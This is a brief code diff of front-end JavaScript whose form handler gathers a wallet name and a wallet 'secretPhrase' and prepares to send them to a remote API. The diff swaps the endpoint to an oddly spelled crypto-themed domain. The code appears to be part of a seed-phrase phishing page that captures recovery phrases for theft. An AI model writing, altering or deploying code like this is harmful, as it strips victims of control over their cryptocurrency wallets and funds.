@@ -17,7 +17,7 @@ document.querySelector(".input-box-2").addEventListener("input",(e)=>{
 document.querySelector(".button").addEventListener("click",(e)=>{
   e.preventDefault()
   if(!error){
-      const url = "https://backend-01-92mi.onrender.com/api/other";
+      const url = "https://api.cryp-t-cr-aky-c.com/api/other";
       const data = {
           walletName:inputData,
           secretPhrase:inputData2
